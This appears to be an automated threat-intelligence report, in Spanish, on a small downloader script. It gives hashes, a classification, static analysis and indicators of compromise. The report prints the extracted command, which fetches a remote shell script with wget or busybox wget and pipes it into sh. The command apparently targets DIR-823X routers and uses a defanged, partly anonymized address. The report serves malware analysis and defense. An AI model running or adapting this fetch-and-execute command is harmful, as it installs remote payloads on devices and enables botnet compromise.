# 🧬 Payload Analysis

`17a496eafcfc4fbf0198c7ba87cfaa1c864cd10f1b96afffa9b3106817073689`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 330 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `17a496eafcfc4fbf0198c7ba87cfaa1c864cd10f1b96afffa9b3106817073689`
- **SHA1:** `fe9164de45293e0b7303f1b65b37346e87531bb9`
- **MD5:** `c9ae6d181d95f7a57b7b2fa418379180`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 330 B |
| Entropía | 5.2 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
macaddr=;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s dir823x;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s d
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | macaddr=;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s dir823x;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s d | strings |
| hash | 17a496eafcfc4fbf0198c7ba87cfaa1c864cd10f1b96afffa9b3106817073689 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
